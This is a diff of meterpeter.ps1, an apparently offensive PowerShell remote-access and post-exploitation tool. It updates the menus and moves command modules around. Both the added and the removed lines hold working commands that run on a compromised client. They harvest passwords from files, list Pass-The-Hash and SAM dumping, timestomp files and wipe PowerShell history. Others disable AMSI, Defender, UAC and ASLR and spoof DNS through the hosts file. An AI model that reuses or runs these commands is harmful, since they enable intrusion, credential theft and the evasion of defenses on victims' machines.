@@ -32,7 +32,7 @@
 
 
 ## Meterpeter Develop version
-$dev_Version = "2.10.3";
+$dev_Version = "2.10.4";
 
 function Character_Obfuscation($String)
 {
@@ -390,15 +390,18 @@ While($Client.Connected)
     {
       $Parse = "$IPATH"+"meterpeter.ps1"
       $SerSat = "$Local_Host"+":"+"$Local_Port";
+      $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+      If(-not($bool)){$SerPrivileges = "UserLand"}else{$SerPrivileges = "SYSTEM"}
       write-host "`n`n Server Settings" -ForegroundColor green;
       write-host " ---------------";
-      write-host " meterpeter dev       : $dev_Version";
-      write-host " Local Architecture   : $env:PROCESSOR_ARCHITECTURE";
-      write-host " Obfuscation Settings : $ob";
-      write-host " Attacker OS flavor   : $Flavor Distro";
-      write-host " Lhost|Lport Settings : $SerSat";
-      write-host " meterpeter WebServer : $APACHE";
-      write-host " meterpeter Server    : $Parse";
+      write-host " meterpeter dev        : $dev_Version";
+      write-host " Local Architecture    : $env:PROCESSOR_ARCHITECTURE";
+      write-host " Obfuscation Settings  : $ob";
+      write-host " Server Privileges     : $SerPrivileges";
+      write-host " Attacker OS flavor    : $Flavor Distro";
+      write-host " Lhost|Lport Settings  : $SerSat";
+      write-host " meterpeter WebServer  : $APACHE";
+      write-host " meterpeter Server     : $Parse";
     }
 
     ## venom v1.0.16 function
@@ -854,12 +857,13 @@ While($Client.Connected)
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
       write-host "   Firewall  Turn On/Off Remote  Firewall    Client:Admin - Privileges Required";
-      write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
       write-host "   Dnspoof   Hijack Entrys in hosts file     Client:Admin - Privileges Required";
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
+      write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
+      write-host "   PtHash    Pass-The-Hash (remote auth)     Server:Admin - Privileges Required";
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
-      $choise = Read-Host;      
+      $choise = Read-Host;
       If($choise -eq "Escalate" -or $choice -eq "escal")
       {
         write-host "`n   Requirements" -ForegroundColor Yellow;
@@ -878,7 +882,7 @@ While($Client.Connected)
         {
           write-host " - Input Delay Time (eg: 60): " -NoNewline;
           $Input_Delay = Read-Host;
-          If(-not($Input_Delay) -or $Input_Delay -lt "40"){$Input_Delay = "60"}
+          If(-not($Input_Delay) -or $Input_Delay -lt "30"){$Input_Delay = "60"}
           $Delay_Time = "$Input_Delay"+"000";
           write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Status   Remote Path           Execution" -ForeGroundColor green;
@@ -891,7 +895,7 @@ While($Client.Connected)
         If($Escal_choise -eq "Delete" -or $Escal_choise -eq "del")
         {
           write-host " Delete Privilege Escalation Old Files|Configurations." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";If(Test-Path `$CommandPath){Remove-Item `$CommandPath -Recurse -Force;cmd /R del /Q /F %tmp%\WStore.vbs;echo `"   [i] Privilege Escalation Registry hive Deleted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Privilege Escalation Vulnerable Registry hive: [NOT FOUND] ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}";
+          $Command = "`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";If(Test-Path `$CommandPath){Remove-Item `$CommandPath -Recurse -Force;echo `"   [i] Privilege Escalation Registry hive Deleted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}else{echo `"   [i] Privilege Escalation Vulnerable Registry hive: [NOT FOUND] ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}";
         }
         If($Escal_choise -eq "Return" -or $Escal_choise -eq "return" -or $Escal_choise -eq "cls" -or $Escal_choise -eq "Modules" -or $Escal_choise -eq "modules" -or $Escal_choise -eq "clear")
         {
@@ -1164,6 +1168,34 @@ While($Client.Connected)
         }
         $logs_choise = $Null;
       }
+      If($choise -eq "SetMace" -or $choise -eq "mace")
+      {
+        write-host " Change File Mace (date/month/year hh:mm:ss)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
+        write-host " - File Absoluct Path: " -NoNewline;
+        $mace_path = Read-Host;
+        write-host " - Input 'day/month/year hh:mm:ss': " -NoNewline;
+        $set_time = Read-Host;write-host "`n`n";
+        If(-not($set_time)){$set_time = "19/12/1999 19:19:19"}
+        $Command = "`$1=`"$mace_path`";If(([System.IO.File]::Exists(`"`$1`"))){Get-ChildItem $mace_path|% {`$_.creationtime = '$set_time'};Get-ChildItem $mace_path|% {`$_.lastaccesstime = '$set_time'};Get-ChildItem $mace_path|% {`$_.LastWriteTime = '$set_time'};Get-ChildItem $mace_path|Select-Object Name,LastWriteTime `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   File: $mace_path Not Found in Remote System`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+      }
+      If($choise -eq "ListPas" -or $choise -eq "pas")
+      {
+        write-host " List Stored Passwords (in Text|Log Files)." -ForegroundColor Blue -BackgroundColor White;
+        write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
+        $Recursive_search = Read-Host;
+        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
+        write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
+        $Command = "cd $Recursive_search|findstr /s /I /C:`"user`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"passw`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"login`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
+      }
+      If($choise -eq "ListDir" -or $choise -eq "dir")
+      {
+        write-host " List Hidden directorys recursive." -ForegroundColor Blue -BackgroundColor White;
+        write-host " - Directory to start search recursive (`$env:userprofile): " -NoNewLine;
+        $Recursive_search = Read-Host;
+        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
+        write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
+        $Command = "Get-ChildItem -Hidden -Path $Recursive_search -Recurse -Force -ErrorAction SilentlyContinue  >` `$env:tmp\hidden.txt;Get-Content `$env:tmp\hidden.txt|Where-Object {`$_ -notmatch '.ini'}|Set-Content `$env:tmp\out.txt;Get-Content `$env:tmp\out.txt|Where-Object {`$_ -notmatch '.dat'}|Set-Content `$env:tmp\out2.txt;Get-Content `$env:tmp\out2.txt|Where-Object {`$_ -notmatch '.tmp'}|Set-Content `$env:tmp\out3.txt;Get-Content `$env:tmp\out3.txt;Remove-Item *.txt -Force";
+      }
       If($choise -eq "GoogleX" -or $choise -eq "googlex")
       {
         ## Start-Process -WindowStyle maximized | cmd /R start firefox
@@ -1184,254 +1216,12 @@ While($Client.Connected)
         If(-not ($MYSpeak -eq $False -or $MYSpeak -eq ""))
         {
           write-host "`n";
-          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -3;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }else{
           write-host "`n";
           $MYSpeak = "Next time dont forget to input the text   ok";
-          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -3;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }
-      }      
-      If($choise -eq "ListPas" -or $choise -eq "pas")
-      {
-        write-host " List Stored Passwords (in Text|Log Files)." -ForegroundColor Blue -BackgroundColor White;
-        write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
-        $Recursive_search = Read-Host;
-        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
-        write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
-        $Command = "cd $Recursive_search|findstr /s /I /C:`"user`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"passw`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"login`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
-      }
-      If($choise -eq "ListDir" -or $choise -eq "dir")
-      {
-        write-host " List Hidden directorys recursive." -ForegroundColor Blue -BackgroundColor White;
-        write-host " - Directory to start search recursive (`$env:userprofile): " -NoNewLine;
-        $Recursive_search = Read-Host;
-        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
-        write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
-        $Command = "Get-ChildItem -Hidden -Path $Recursive_search -Recurse -Force -ErrorAction SilentlyContinue  >` `$env:tmp\hidden.txt;Get-Content `$env:tmp\hidden.txt|Where-Object {`$_ -notmatch '.ini'}|Set-Content `$env:tmp\out.txt;Get-Content `$env:tmp\out.txt|Where-Object {`$_ -notmatch '.dat'}|Set-Content `$env:tmp\out2.txt;Get-Content `$env:tmp\out2.txt|Where-Object {`$_ -notmatch '.tmp'}|Set-Content `$env:tmp\out3.txt;Get-Content `$env:tmp\out3.txt;Remove-Item *.txt -Force";
-      }
-      If($choise -eq "SetMace" -or $choise -eq "mace")
-      {
-        write-host " Change File Mace (date/month/year hh:mm:ss)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
-        write-host " - File Absoluct Path: " -NoNewline;
-        $mace_path = Read-Host;
-        write-host " - Input 'day/month/year hh:mm:ss': " -NoNewline;
-        $set_time = Read-Host;write-host "`n`n";
-        If(-not($set_time)){$set_time = "19/12/1999 19:19:19"}
-        $Command = "`$1=`"$mace_path`";If(([System.IO.File]::Exists(`"`$1`"))){Get-ChildItem $mace_path|% {`$_.creationtime = '$set_time'};Get-ChildItem $mace_path|% {`$_.lastaccesstime = '$set_time'};Get-ChildItem $mace_path|% {`$_.LastWriteTime = '$set_time'};Get-ChildItem $mace_path|Select-Object Name,LastWriteTime `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   File: $mace_path Not Found in Remote System`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-      }
-      If($choise -eq "AMSIset" -or $choise -eq "amsi")
-      {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Disable   Disable AMSI (regedit)          Client:User OR ADMIN - Privs Required";
-        write-host "   Enable    Enable  AMSI (regedit)          Client:User OR ADMIN - Privs Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Amsi> " -NoNewline -ForeGroundColor Green;
-        $choise_two = Read-Host;
-        If($choise_two -eq "Disable" -or $choise_two -eq "off")
-        {
-          ## HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender -value DisableAntiSpyware 1 (dword32) | Set-MpPreference -DisableRealtimeMonitoring $True
-          write-host " Disable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -value 1 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -value 0 -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Enable" -or $choise_two -eq "on")
-        {
-          write-host " Enable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-ItemProperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Remove-ItemProperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
-        {
-          $Command = $Null;
-          $choise_two = $Null;
-        }
-        $choise_two = $Null;
-      }
-      If($choise -eq "UACSet" -or $choise -eq "uac")
-      {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Disable   Disable Remote UAC              Client:Admin - Privileges Required";
-        write-host "   Enable    Enable Remote UAC               Client:Admin - Privileges Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Uac> " -NoNewline -ForeGroundColor Green;
-        $choise_two = Read-Host;
-        If($choise_two -eq "Disable" -or $choise_two -eq "off")
-        {
-          write-host " Turn OFF Remote-Host UAC .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Enable" -or $choise_two -eq "on")
-        {
-          write-host " Turn ON Remote-Host UAC .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 1 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
-        {
-          $Command = $Null;
-          $choise_two = $Null;
-        }
-        $choise_two = $Null;
-      }
-      If($choise -eq "NoDrive" -or $choise -eq "nodrive")
-      {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Disable   Hide Drives from explorer       Client:Admin - Privileges Required";
-        write-host "   Enable    Show Drives in Explorer         Client:Admin - Privileges Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Drives> " -NoNewline -ForeGroundColor Green;
-        $choise_two = Read-Host;
-        If($choise_two -eq "Disable" -or $choise_two -eq "off")
-        {
-          write-host " Hide All Drives (C:D:E:F:G) From Explorer .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' | select-Object NoDrives,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Enable" -or $choise_two -eq "on")
-        {
-          write-host " Display All Drives (C:D:E:F:G) In Explorer .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' -Force;Get-Item -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
-        {
-        $choise = $Null;
-        $Command = $Null;
-        }
-      }
-      If($choise -eq "ASLRSet" -or $choise -eq "aslr")
-      {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Disable   Disable ASLR (regedit)          Client:ADMIN - Privileges Required";
-        write-host "   Enable    Enable  ASLR (regedit)          Client:ADMIN - Privileges Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Aslr> " -NoNewline -ForeGroundColor Green;
-        $choise_two = Read-Host;
-        If($choise_two -eq "Disable" -or $choise_two -eq "off")
-        {
-          write-host " Disable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 0 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Enable" -or $choise_two -eq "on")
-        {
-          write-host " Enable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 1 -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
-        {
-        $Command = $Null;
-        $choise_two = $Null;
-        }
-      }      
-      If($choise -eq "TaskMan" -or $choise -eq "task")
-      {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Disable   Disable Remote TaskManager      Client:Admin - Privileges Required";
-        write-host "   Enable    Enable Remote TaskManager       Client:Admin - Privileges Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:TaskManager> " -NoNewline -ForeGroundColor Green;
-        $choise_two = Read-Host;
-        If($choise_two -eq "Disable" -or $choise_two -eq "off")
-        {
-          write-host " Turn OFF Remote-Host Task Manager .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Enable" -or $choise_two -eq "on")
-        {
-          write-host " Turn ON Remote-Host Task Manager .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
-        {
-        $choise = $Null;
-        $Command = $Null;
-        }
-      }
-      If($choise -eq "Dnspoof" -or $choise -eq "dns")
-      {
-        write-host "`n   Warnning" -ForegroundColor Yellow;
-        write-host "   --------";
-        write-host "   The First time 'Spoof' module its used, it will backup";
-        write-host "   the real hosts file (hosts-backup) there for its importante";
-        write-host "   to allways 'Default' the hosts file before using 'Spoof' again.";
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Check     Review hosts File               Client:User  - Privileges Required";
-        write-host "   Spoof     Add Entrys to hosts             Client:Admin - Privileges Required";
-        write-host "   Default   Defaults the hosts File         Client:Admin - Privileges Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Dns> " -NoNewline -ForeGroundColor Green;
-        $choise_two = Read-Host;
-        If($choise_two -eq "Check" -or $choise_two -eq "check")
-        {
-          write-host " Review hosts File Settings .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "Get-Content `$env:windir\System32\drivers\etc\hosts `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve: $Remote_Host hosts file ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Spoof" -or $choise_two -eq "spoof")
-        {
-          write-host " - IpAddr to Redirect: " -NoNewline;
-          $Ip_spoof = Read-Host;
-          write-host " - Domain to be Redirected: " -NoNewline;
-          $Domain_spoof = Read-Host;
-          If(-not($Ip_spoof)){$Ip_spoof = "$localIpAddress"}
-          If(-not($Domain_spoof)){$Domain_spoof = "www.google.com"}
-          ## Copy-Item -Path '$env:windir\system32\Drivers\etc\hosts' -Destination '%SYSTEMROOT%\system32\Drivers\etc\hosts-backup' -Force
-          write-host " Redirecting Domains Using hosts File (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;
-          write-host " Redirect Domain: $Domain_spoof TO IPADDR: $Ip_spoof" -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Copy-Item -Path `$env:windir\system32\Drivers\etc\hosts -Destination `$env:windir\system32\Drivers\etc\hosts-backup -Force;Add-Content `$env:windir\System32\drivers\etc\hosts '$Ip_spoof $Domain_spoof';echo `"   [i] Dns Entry Added to Remote hosts File`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
-        }
-        If($choise_two -eq "Default" -or $choise_two -eq "default")
-        {
-          write-host " Revert Remote hosts File To Default (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Move-Item -Path `$env:windir\system32\Drivers\etc\hosts-backup -Destination `$env:windir\system32\Drivers\etc\hosts -Force;echo `"   [i] Remote hosts File Reverted to Default Settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
-        }
-        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
-        {
-          $Command = $Null;
-          $choise_two = $Null;
-        }
-        $choise = $Null;
-        $Ip_spoof = $Null;
-        $choise_two = $Null;
-        $Domain_spoof = $Null;
-      }
-      If($choise -eq "Firewall" -or $choise -eq "firewall")
-      {
-        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
-        write-host "   -------   -----------                     ------";
-        write-host "   Check     Review Firewall Settings        Client:User  - Privileges Required";
-        write-host "   Disable   Disable Remote Firewall         Client:Admin - Privileges Required";
-        write-host "   Enable    Enable Remote Firewall          Client:Admin - Privileges Required";
-        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Firewall> " -NoNewline -ForeGroundColor Green;
